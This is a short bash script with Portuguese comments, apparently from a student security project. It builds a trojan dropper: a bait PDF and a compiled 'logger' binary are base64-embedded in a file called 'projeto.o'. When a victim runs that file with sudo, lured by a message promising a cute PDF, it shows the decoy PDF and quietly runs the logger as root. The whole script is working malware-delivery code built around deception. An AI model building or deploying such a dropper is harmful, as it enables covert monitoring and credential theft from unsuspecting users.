#!/bin/bash

# Como usar:
# 1. Coloque este script na mesma pasta que:
#    - gato.pdf (arquivo bait)
#    - out.out (logger compilado)
# 2. Execute: "./projeto.o" no terminal
# 3. O arquivo "projeto.o" será gerado
# 4. Enviar apenas o arquivo "projeto.o"
# 5. Para testar: "sudo ./projeto.o"
# ============================================

# Codifica os arquivos em base64
PDF_B64=$(base64 -w0 gato.pdf)
LOG_B64=$(base64 -w0 ../bin/out.out)  

# Gera o conteúdo e arquivo final
cat > projeto.o << 'EOF'
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
    echo "Precisa ser executado com admin para abrir o pdf fofo:3"
    exit 1
fi

# Verifica se o logger ja esta em execucao
if pgrep -x "out.out" > /dev/null; then
    # Abre o PDF sem modo sudo se o logger já estiver rodando
    if [ -n "$SUDO_USER" ]; then
        sudo -u "$SUDO_USER" xdg-open /tmp/trabalho.pdf 2>/dev/null &
    else
        xdg-open /tmp/trabalho.pdf 2>/dev/null &
    fi
    exit 0
fi   

PDF_B64="SUBSTITUIR_PDF"
LOG_B64="SUBSTITUIR_LOG"

# Decodifica os arquivos
echo "$PDF_B64" | base64 -d > /tmp/trabalho.pdf
echo "$LOG_B64" | base64 -d > /tmp/out.out

# Permite a execução do logger
chmod +x /tmp/out.out

# Abre o pdf sem o modo sudo 
if [ -n "$SUDO_USER" ]; then
    sudo -u "$SUDO_USER" xdg-open /tmp/trabalho.pdf 2>/dev/null &
else
    xdg-open /tmp/trabalho.pdf 2>/dev/null &
fi

# Executa o logger
/tmp/out.out &

exit 0
EOF

# Substitui os placeholders
sed -i "s|SUBSTITUIR_PDF|$PDF_B64|" projeto.o
sed -i "s|SUBSTITUIR_LOG|$LOG_B64|" projeto.o

# Dá permissão de execução
chmod +x projeto.o